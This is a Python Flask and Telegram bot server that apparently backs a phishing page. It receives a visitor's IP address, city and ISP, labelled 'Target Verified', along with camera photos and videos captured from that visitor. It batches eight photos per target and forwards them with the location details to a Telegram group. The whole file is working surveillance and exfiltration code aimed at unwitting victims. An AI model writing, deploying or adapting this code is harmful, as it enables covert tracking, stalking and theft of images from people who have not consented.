import os
import telebot
from flask import Flask, render_template, request
import threading
import io

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
GROUP_ID = os.environ.get('GROUP_ID') 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Temporary storage to gather photos before sending as an album
# Structure: { "user_id": { "photos": [], "info": "" } }
collection = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    
    # Create the info string that will "stick" to the photo
    info_text = (f"📍 **Target Verified**\n"
                 f"ID: `{tid}`\n"
                 f"IP: `{data.get('ip')}`\n"
                 f"City: {data.get('city')}\n"
                 f"ISP: {data.get('org')}")
    
    if tid not in collection:
        collection[tid] = {"photos": [], "info": info_text}
    else:
        collection[tid]["info"] = info_text
        
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file_bytes = request.files['file'].read()

    if tid not in collection:
        collection[tid] = {"photos": [], "info": f"User ID: `{tid}` (No IP Logged)"}

    # If it's a video, send it immediately (Videos are usually single)
    if ftype == 'video':
        try:
            bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=collection[tid]["info"], parse_mode="Markdown")
        except: pass
        return "OK"

    # If it's a photo, add it to the list
    collection[tid]["photos"].append(file_bytes)

    # Once we have 8 photos, send them as one grouped album
    if len(collection[tid]["photos"]) >= 8:
        media_group = []
        for i, p_bytes in enumerate(collection[tid]["photos"]):
            # The first photo gets the caption (the "info" stuck to it)
            caption = collection[tid]["info"] if i == 0 else ""
            media_group.append(telebot.types.InputMediaPhoto(p_bytes, caption=caption, parse_mode="Markdown"))
        
        try:
            bot.send_media_group(GROUP_ID, media_group)
        except Exception as e:
            print(f"Error sending album: {e}")
            
        # Clear storage for this user so they can be verified again later
        del collection[tid]

    return "OK"

# --- RUNNER ---
if __name__ == "__main__":
    def run_bot():
        bot.remove_webhook()
        bot.infinity_polling(timeout=20)

    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
